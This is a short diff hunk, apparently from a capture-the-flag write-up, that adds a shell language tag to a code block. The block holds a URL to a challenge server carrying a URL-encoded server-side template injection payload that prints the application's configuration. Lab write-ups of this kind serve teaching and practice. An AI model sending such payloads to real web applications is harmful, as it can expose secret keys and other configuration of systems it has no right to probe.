@@ -19,7 +19,7 @@ Can you exploit this simple mistake?
 
 > ENCODED COMMAND TO URL
 
-```
+```sh
 165.232.32.50:31397/%7B%7Bconfig.items()%7D%7D
 ```
 
